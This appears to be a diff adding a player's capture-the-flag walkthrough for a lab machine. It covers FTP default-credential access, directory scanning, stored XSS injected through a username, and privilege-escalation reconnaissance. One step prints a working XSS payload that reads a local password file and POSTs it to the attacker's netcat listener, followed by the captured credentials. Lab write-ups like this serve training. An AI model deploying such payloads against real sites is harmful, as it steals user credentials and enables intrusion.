@@ -1,0 +1,41 @@
+after doing an nmap scan i opened the website visited: login.php, blog.php, index.php
+tried to brute force password using python script but still wont open
+so i tried default credentials of ftp which is ftp:ftp and it worked
+i found a file called update.txt
+so i transfered it to local: get update.txt
+and he said in the file there are credentials in 127.0.0.1/dir/pass.txt
+
+after running a ffuf directory scan i discovery some interesting files
+i found /register so i created an account. posted some comment then i tried to pass vulnerable comment(XSS)
+but it didnt work it just appears as text 
+after some time i tried creating and account name "<script>alert(1);</script>", logged in 
+then i posted a comment and the XSS i found the alert appeared
+<script>fetch("127.0.0.1/dir/pass.txt").then(res=>{console.log(res.json())})</script>
+but it was blocked by CORS (observed from intercept console)
+so i tried to fetch it and send it to my 0.0.0.0:4444
+
+<script>fetch("http://127.0.0.1/dir/pass.txt").then(x=>x.text()).then(res=>fetch("http://192.168.146.215:4444",{method:'POST',body:res}));</script>
++
+nc -lnvp 4444
+OUTPUT:
+Connection received on 10.114.138.1 36584
+POST / HTTP/1.1
+Host: 192.168.146.215:4444
+Connection: keep-alive
+Content-Length: 32
+Origin: http://127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: http://127.0.0.1/blog.php
+Accept-Encoding: gzip, deflate
+
+jack:WhyIsMyPasswordSoStrongIDK
+
+so i used this credentials to ssh
+then i found the first flag which is in user.txt
+
+next i used LinEnum to look for any privilege escalation
+nothing was found so i searched manually until i found /opt/urgent.txt file + one pcap file
+i tried to check /usr/lib/cgi-bin/ but i dont have permission
+so i transfered the pcap file to my host machine to analyse it
